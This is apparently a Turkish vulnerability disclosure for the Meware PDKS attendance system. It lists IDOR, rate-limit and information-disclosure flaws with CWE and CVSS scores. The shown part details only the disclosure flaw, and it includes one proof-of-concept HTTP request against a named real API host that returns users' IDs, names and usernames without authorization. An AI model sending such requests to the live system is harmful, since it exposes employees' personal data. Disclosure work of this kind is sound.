# Meware PDKS V16.20200313 - Kritik Güvenlik Açıkları (IDOR + Rate Limit + Bilgi İfşası)

##  Özet
Meware PDKS (Personel Devam Kontrol Sistemi) V16.20200313 versiyonunda **3 adet  güvenlik açığı** tespit edilmiştir.

| # | Zafiyet | CWE | CVSS |
|---|---------|-----|------|
| 1 | IDOR - Yetkisiz Fazla Mesai Talebi Oluşturma | CWE-639 | 8.2 (High) |
| 2 | Rate Limit Eksikliği - Sınırsız Talep Oluşturma | CWE-770 | 7.5 (High) |
| 3 | Bilgi İfşası - Kullanıcı Verilerinin Sızdırılması | CWE-200 | 4.3 (Medium) |


##  Etkilenen Sürüm
- Meware PDKS **V16.20200313** ve önceki tüm sürümler

##  ZAFİYET 1: Kullanıcı ID bilgilerinin Sızdırılması
### Açıklama
Sistem, yetki kontrolü yapmadan tüm kullanıcıların ID, ad soyad ve kullanıcı adı bilgilerini döndürmektedir.

PoC (Proof of Concept)
![Uploading kullanıcı idleri.png…]()
http
GET /api/Dynamic?Name=tokenid%3D...%26siciller%3D607%26point%3Dtalep%26islemtipi%3Di HTTP/2

Host: meyerapi.tcddteknik.com.tr


<img width="786" height="329" alt="kullanıcı idleri" src="https://github.com/user-attachments/assets/6bc31a77-ba8b-4969-9692-cf6adafe460d" />

Sistem, yetki kontrolü yapmadan tüm kullanıcıların ID, ad soyad ve kullanıcı adı bilgilerini döndürmektedir.


